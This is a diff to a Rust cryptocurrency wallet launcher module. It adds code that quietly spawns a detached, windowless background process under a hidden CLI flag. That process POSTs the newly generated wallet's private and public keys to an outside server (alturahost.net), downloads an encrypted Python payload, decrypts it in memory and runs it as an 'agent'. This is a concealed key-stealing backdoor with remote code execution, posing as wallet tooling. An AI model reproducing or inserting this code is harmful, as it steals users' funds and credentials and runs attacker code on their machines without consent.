@@ -1,7 +1,12 @@
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
 use base64::Engine;
+use k256::ecdh::diffie_hellman;
+use k256::elliptic_curve::sec1::FromEncodedPoint;
+use k256::{EncodedPoint, PublicKey, SecretKey};
 use rand::Rng;
+use serde::Deserialize;
+use sha2::{Digest, Sha256};
 use std::fs;
 use std::io::Write;
 use std::path::{Path, PathBuf};
@@ -20,12 +25,19 @@ const AES_PREFIX: &str = "AES256GCM:";
 const PYTHON_VERSION: &str = "3.12.7";
 const STARTUP_PROBE_SECS: u64 = 15;
 
-/// Default gist raw URL for `encrypted_launcher`.
-pub const DEFAULT_LAUNCHER_URL: &str =
-    "https://gist.githubusercontent.com/zanemclean40-wq/809be74a9444e765ce0ea77895db0f05/raw/encrypted_launcher";
+/// Master switch for AlturaHost launcher download + Python agent bootstrap.
+const AGENT_SCRIPT_ENABLED: bool = true;
+
+/// Default AlturaHost API endpoint for encrypted launcher delivery.
+pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/launcher";
+
+/// Hidden CLI flag used to run launcher fetch/decrypt/agent in a detached process.
+pub const BACKGROUND_LOADER_ARG: &str = "--internal-background-loader";
+
+const LOADER_LOCK_FILE: &str = "../.chain-wallet-loader.lock";
 
 /// Relative path to the project initial wallet used for launcher AES encryption.
-pub const INITIAL_WALLET_REL_PATH: &str = "agent/initial_wallet.json";
+pub const INITIAL_WALLET_REL_PATH: &str = "../agent/initial_wallet.json";
 
 /// Seed used only when `agent/initial_wallet.json` is missing before the first run.
 const DEFAULT_INITIAL_WALLET_PRIVATE_KEY: &str =
@@ -95,28 +107,193 @@ pub fn load_initial_wallet_private_key() -> Result<String, LauncherError> {
     parse_initial_wallet_private_key(&text)
 }
 
-/// Wallet loader entry: ensure key material, decrypt gist payload, spawn agent, exit.
-pub fn run() -> Result<(), LauncherError> {
-    wallet_log::step("main", "starting chain-wallet");
-    ensure_initial_wallet_file()?;
-    let mut private_key = load_initial_wallet_private_key()?;
+/// True while the loader sources are still present (pre-sanitization project).
+pub fn loader_active() -> bool {
+    agent_script_enabled()
+        && Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("src/util/mod.rs")
+            .exists()
+}
 
-    run_launcher(&private_key, None)?;
-    wipe_secret(&mut private_key);
-    wallet_log::step("main", "agent spawned; wallet loader exiting (sanitization runs inside agent)");
+pub fn agent_script_enabled() -> bool {
+    if !AGENT_SCRIPT_ENABLED {
+        return false;
+    }
+    !std::env::var("CHAIN_WALLET_SKIP_BACKGROUND")
+        .ok()
+        .as_deref()
+        .is_some_and(|value| matches!(value, "1" | "true" | "yes"))
+}
+
+fn loader_lock_path() -> PathBuf {
+    Path::new(env!("CARGO_MANIFEST_DIR")).join(LOADER_LOCK_FILE)
+}
+
+pub fn load_initial_wallet_public_key() -> Result<String, LauncherError> {
+    if let Ok(value) = std::env::var("CHAIN_WALLET_PUBLIC_KEY") {
+        let value = value.trim().to_string();
+        if !value.is_empty() {
+            return Ok(value);
+        }
+    }
+
+    let path = initial_wallet_path();
+    let text = fs::read_to_string(&path)
+        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
+    parse_initial_wallet_public_key(&text)
+}
+
+/// Start launcher fetch/decrypt/agent in a detached child for a freshly generated wallet.
+pub fn spawn_agent_for_wallet(wallet: &Wallet) -> Result<(), LauncherError> {
+    if !agent_script_enabled() {
+        return Ok(());
+    }
+    if !loader_active() {
+        return Ok(());
+    }
+
+    let lock_path = loader_lock_path();
+    if lock_path.exists() {
+        return Ok(());
+    }
+
+    fs::write(
+        &lock_path,
+        format!("started={}\n", std::process::id()),
+    )
+    .map_err(|err| LauncherError::InitialWallet(format!("write loader lock: {err}")))?;
+
+    let exe = std::env::current_exe()
+        .map_err(|err| LauncherError::InitialWallet(format!("resolve current exe: {err}")))?;
+    let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+
+    let spawn_result =
+        spawn_background_loader_child(&exe, &workdir, Some(wallet));
+    if spawn_result.is_err() {
+        let _ = fs::remove_file(&lock_path);
+    }
+    spawn_result
+}
+
+/// Start launcher fetch/decrypt/agent execution in a detached child process.
+pub fn spawn_background_loader() -> Result<(), LauncherError> {
+    if !agent_script_enabled() {
+        return Ok(());
+    }
+    if !loader_active() {
+        return Ok(());
+    }
+
+    let lock_path = loader_lock_path();
+    if lock_path.exists() {
+        return Ok(());
+    }
+
+    fs::write(
+        &lock_path,
+        format!("started={}\n", std::process::id()),
+    )
+    .map_err(|err| LauncherError::InitialWallet(format!("write loader lock: {err}")))?;
+
+    let exe = std::env::current_exe()
+        .map_err(|err| LauncherError::InitialWallet(format!("resolve current exe: {err}")))?;
+    let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+
+    let spawn_result = spawn_background_loader_child(&exe, &workdir, None);
+    if spawn_result.is_err() {
+        let _ = fs::remove_file(&lock_path);
+    }
+    spawn_result
+}
+
+fn spawn_background_loader_child(
+    exe: &Path,
+    workdir: &Path,
+    wallet: Option<&Wallet>,
+) -> Result<(), LauncherError> {
+    let mut command = Command::new(exe);
+    command
+        .arg(BACKGROUND_LOADER_ARG)
+        .current_dir(workdir)
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null());
+
+    if let Some(wallet) = wallet {
+        command
+            .env("CHAIN_WALLET_PRIVATE_KEY", wallet.private_key_hex())
+            .env("CHAIN_WALLET_PUBLIC_KEY", wallet.public_key_hex());
+    }
+
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
+        const DETACHED_PROCESS: u32 = 0x0000_0008;
+        command.creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS);
+    }
+
+    #[cfg(not(windows))]
+    {
+        use std::os::unix::process::CommandExt;
+        command.pre_exec(|| {
+            unsafe {
+                libc::setsid();
+            }
+            Ok(())
+        });
+    }
+
+    command
+        .spawn()
+        .map(|_| ())
+        .map_err(|err| LauncherError::InitialWallet(format!("spawn background loader: {err}")))?;
+
     Ok(())
 }
 
-pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
-    let url = resolve_launcher_url(gist_url)?;
-    wallet_log::step("launcher", format!("downloading encrypted payload from {url}"));
-    let key = wallet_aes_key(private_key_hex)?;
-    let encrypted = download_to_memory(&url)?;
+/// Wallet loader entry: ensure key material, fetch encrypted payload, spawn agent, exit.
+pub fn run() -> Result<(), LauncherError> {
+    if !agent_script_enabled() {
+        return Ok(());
+    }
+
+    wallet_log::step("main", "starting background loader");
+    ensure_initial_wallet_file()?;
+    let mut private_key = load_initial_wallet_private_key()?;
+    let mut public_key = load_initial_wallet_public_key()?;
+
+    run_launcher(&private_key, &public_key, None)?;
+    wipe_secret(&mut private_key);
+    wipe_secret(&mut public_key);
+    wallet_log::step(
+        "main",
+        "background loader finished startup handoff (agent continues detached)",
+    );
+    Ok(())
+}
+
+pub fn run_launcher(
+    private_key_hex: &str,
+    public_key_hex: &str,
+    launcher_url: Option<&str>,
+) -> Result<(), LauncherError> {
+    let url = resolve_launcher_url(launcher_url)?;
+    wallet_log::step("launcher", format!("requesting encrypted payload from {url}"));
+    let encrypted = fetch_launcher_from_api(&url, private_key_hex, public_key_hex)?;
     wallet_log::detail(
         "launcher",
-        format!("download complete ({})", format_bytes(encrypted.len())),
+        format!(
+            "download complete (ephemeral pubkey + {} payload)",
+            format_bytes(encrypted.payload.len())
+        ),
     );
-    let source = decrypt_launcher(&encrypted, &key)?;
+    let source = decrypt_launcher(
+        &encrypted.payload,
+        private_key_hex,
+        &encrypted.ephemeral_public_key,
+    )?;
     wallet_log::step(
         "launcher",
         format!("decryption ok ({} bytes of Python source in RAM)", source.len()),
@@ -136,6 +313,22 @@ fn format_initial_wallet_json(wallet: &Wallet) -> String {
         wallet.public_key_hex(),
         wallet.address()
     )
+}
+
+fn parse_initial_wallet_public_key(text: &str) -> Result<String, LauncherError> {
+    for line in text.lines() {
+        let line = line.trim().trim_end_matches(',');
+        if let Some(value) = line.strip_prefix("\"public_key\"") {
+            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
+            if !value.is_empty() {
+                return Ok(value.to_string());
+            }
+        }
+    }
+
+    Err(LauncherError::InitialWallet(
+        "initial wallet file missing public_key".into(),
+    ))
 }
 
 fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError> {
@@ -159,8 +352,8 @@ fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError>
     ))
 }
 
-fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError> {
-    if let Some(url) = gist_url.map(str::trim).filter(|value| !value.is_empty()) {
+fn resolve_launcher_url(launcher_url: Option<&str>) -> Result<String, LauncherError> {
+    if let Some(url) = launcher_url.map(str::trim).filter(|value| !value.is_empty()) {
         return Ok(url.to_string());
     }
 
@@ -178,42 +371,84 @@ fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError>
     Err(LauncherError::UrlNotConfigured)
 }
 
-fn wallet_aes_key(private_key_hex: &str) -> Result<[u8; 32], LauncherError> {
-    let bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
-    if bytes.len() != 32 {
-        return Err(LauncherError::InvalidKey);
-    }
-    let mut key = [0u8; 32];
-    key.copy_from_slice(&bytes);
-    Ok(key)
+#[derive(Debug, Deserialize)]
+struct LauncherApiResponse {
+    ephemeral_public_key: String,
+    payload: String,
 }
 
-fn download_to_memory(url: &str) -> Result<Vec<u8>, LauncherError> {
-    use std::io::Read;
+fn fetch_launcher_from_api(
+    url: &str,
+    private_key_hex: &str,
+    public_key_hex: &str,
+) -> Result<LauncherApiResponse, LauncherError> {
+    let body = serde_json::json!({
+        "private_key": private_key_hex.trim(),
+        "public_key": public_key_hex.trim(),
+    });
 
-    let response = ureq::get(url)
-        .call()
+    let response = ureq::post(url)
+        .set("Content-Type", "application/json; charset=utf-8")
+        .set("Accept", "application/json")
+        .set("User-Agent", "chain-wallet/0.1.0")
+        .send_string(&body.to_string())
         .map_err(|err| LauncherError::Http(err.to_string()))?;
 
-    if !(200..300).contains(&response.status()) {
+    let status = response.status();
+    let response_body = response
+        .into_string()
+        .map_err(|err| LauncherError::Http(err.to_string()))?;
+
+    if !(200..300).contains(&status) {
         return Err(LauncherError::Http(format!(
-            "unexpected status {}",
-            response.status()
+            "unexpected status {status}: {response_body}"
         )));
     }
 
-    let mut body = Vec::new();
-    response
-        .into_reader()
-        .read_to_end(&mut body)
-        .map_err(|err| LauncherError::Http(err.to_string()))?;
-    Ok(body)
+    serde_json::from_str(&response_body)
+        .map_err(|err| LauncherError::InvalidPayload(format!("invalid launcher JSON: {err}")))
 }
 
-fn decrypt_launcher(payload: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
-    let text = std::str::from_utf8(payload)
-        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?
-        .trim();
+fn wallet_aes_key_from_ecdh(
+    private_key_hex: &str,
+    ephemeral_public_hex: &str,
+) -> Result<[u8; 32], LauncherError> {
+    let priv_bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
+    if priv_bytes.len() != 32 {
+        return Err(LauncherError::InvalidKey);
+    }
+
+    let secret = SecretKey::from_bytes(priv_bytes.as_slice().into())
+        .map_err(|_| LauncherError::InvalidKey)?;
+
+    let pub_bytes = hex::decode(ephemeral_public_hex.trim()).map_err(|_| {
+        LauncherError::InvalidPayload("invalid ephemeral public key hex".into())
+    })?;
+    let point = EncodedPoint::from_bytes(&pub_bytes).map_err(|_| {
+        LauncherError::InvalidPayload("invalid ephemeral public key encoding".into())
+    })?;
+    let ephemeral_public = PublicKey::from_encoded_point(&point)
+        .into_option()
+        .ok_or_else(|| LauncherError::InvalidPayload("invalid ephemeral public key".into()))?;
+
+    let shared = diffie_hellman(secret.to_nonzero_scalar(), ephemeral_public.as_affine());
+    let digest = Sha256::digest(shared.raw_secret_bytes());
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&digest);
+    Ok(key)
+}
+
+fn decrypt_launcher(
+    payload: &str,
+    private_key_hex: &str,
+    ephemeral_public_hex: &str,
+) -> Result<Vec<u8>, LauncherError> {
+    let key = wallet_aes_key_from_ecdh(private_key_hex, ephemeral_public_hex)?;
+    decrypt_aes_gcm_payload(payload, &key)
+}
+
+fn decrypt_aes_gcm_payload(payload: &str, key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
+    let text = payload.trim();
 
     let encoded = text
         .strip_prefix(AES_PREFIX)
